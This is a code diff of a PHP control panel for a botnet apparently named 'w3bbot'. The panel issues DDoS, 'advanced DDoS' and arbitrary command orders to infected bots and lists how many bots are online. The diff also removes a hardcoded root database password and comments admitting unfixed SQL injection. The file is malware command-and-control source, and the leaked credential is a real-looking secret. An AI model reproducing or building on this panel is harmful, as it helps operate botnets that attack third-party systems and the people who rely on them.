@@ -1,5 +1,6 @@
 <?php
 
+	//Server Information:
 	$server_os = shell_exec("uname -o");
 	$server_kernel = shell_exec("uname -r");
 	$server_ip = $_SERVER["SERVER_ADDR"];
@@ -9,10 +10,12 @@
 
 	$page = (isset($_GET['page']))? $_GET['page'] : 1;
 
-	$mysql_host = "127.0.0.1";
-	$mysql_user = "root";
-	$mysql_pass = "mouse.mysql.25";
+	//Mysql Credentials:
+	$mysql_host = "";
+	$mysql_user = "";
+	$mysql_pass = "";
 
+	//Mysql Configuration:
 	$mcon = mysql_connect($mysql_host, $mysql_user, $mysql_pass);
 	mysql_select_db("w3bbot", $mcon);
 
@@ -196,8 +199,9 @@
 				<hr size=3px color="black" width=580px align=center />
 				<div id="comand_bots">
 					<?php
-						//php for function
+						//Call json.php fucntions:
 						include 'json.php';
+
 
 						function Scommand_json_ddos(){
 							if(isset($_POST['cb_ddos'])){
@@ -211,6 +215,7 @@
 							}
 
 						}
+
 
 						function Scommand_json_Addos(){
 							if(isset($_POST['cb_advddos']) and isset($_POST['cb_advddos_threads'])){
@@ -226,6 +231,7 @@
 							}
 
 						}
+
 
 						function Scommand_json_command(){
 							$command = null;
@@ -253,16 +259,17 @@
 				<div id="info_bots">
 					<h3>Bot's Information</h3>
 					<?php
+						//Query for to get number of total bots and bots online:
 						$bot_data = mysql_query("SELECT * FROM bots", $mcon);
 						$bot_data_linhas = mysql_num_rows($bot_data);
 
 						$bot_data_status = mysql_query("SELECT bot_status FROM bots WHERE bot_status=1", $mcon);
 						$bot_data_status_linhas = mysql_num_rows($bot_data_status);
 
+						//Show on html bots informations:
 						echo("<lable style='font-size: 16px;'>Total Bot's: $bot_data_linhas</lable><br>");
 						echo("<lable style='font-size: 16px;'>Bot's Online: $bot_data_status_linhas</lable><br><br>");
-						//Codigo ainda nao criado
-						//mas vai mostrar os bots onlines cadastrados!
+
 					?>
 					<form method="post" action="" id="cbots_refresh">
 						<lable style="font-size: 16px;">Refresh Bot's</label> <input type="submit" value="Refresh" name="c_refresh" id="sub_refresh">
@@ -278,11 +285,8 @@
 						<th>OPERATION SYSTEM</th>
 					</tr>
 					<?php
-						// Falta Arrumar isso proteger contra sql injection (=.
-						//criar um botao de refresh para atualizar os bot online. na page so serao exibidos os onlines .
-						// Obs: vai dar trabalho.... so bad ....
-						//vou dormir agr amanha eu arrumo.....!
 
+						//Show bots in html list:
 						$max_itens_page = 23;
 						$numpages = ceil($bot_data_linhas/$max_itens_page);
 						$begin_page = ($max_itens_page * $page) - $max_itens_page;
@@ -309,6 +313,8 @@
 				<div id="bots_pages">
 					<span id="font_pages">
 						<?php
+
+							//Code for to select bot page and
 							for($i = 1; $i < $numpages + 1; $i++) {
 								echo "<a href='index.php?page=$i'>".$i."</a> ";
 							}
